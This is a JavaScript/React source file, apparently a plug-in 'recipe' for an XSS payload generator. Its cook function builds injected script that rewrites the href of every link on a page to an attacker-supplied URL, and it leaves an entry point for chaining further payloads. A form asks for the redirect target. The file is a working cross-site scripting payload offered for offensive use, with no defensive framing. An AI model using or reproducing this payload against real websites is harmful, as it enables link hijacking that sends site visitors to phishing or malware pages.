import React from 'react'
import RecipeTextField from '~/components/RecipeTextField'

export function cook (instance, vars) {
  const url = instance.url
    .replace(/\\/g, '\\\\')
    .replace(/'/g, `\\'`)

  const payload = [
    `for (var i = 0; i < document.links.length; i++) {`,
    `  var a = document.links[i];`,
    `  a.href = '${url}';`,
    `}`,
    `__XSS_CHEF_ENTRY_POINT__`
  ].join('\n')

  return {
    payload: vars.payload.replace(
      '__XSS_CHEF_ENTRY_POINT__',
      payload
    )
  }
}

export function init () {
  return {
    url: ''
  }
}

export function render (instance, setRecipeProperty) {
  return (
    <div>
      <RecipeTextField
        bindTo="url"
        instance={instance}
        label="New URL"
        placeholder="Example: http://your.domain.com/"
        setRecipeProperty={setRecipeProperty}
      />
    </div>
  )
}

export function validate (instance) {
  if (instance.url === '') {
    return false
  }

  return true
}
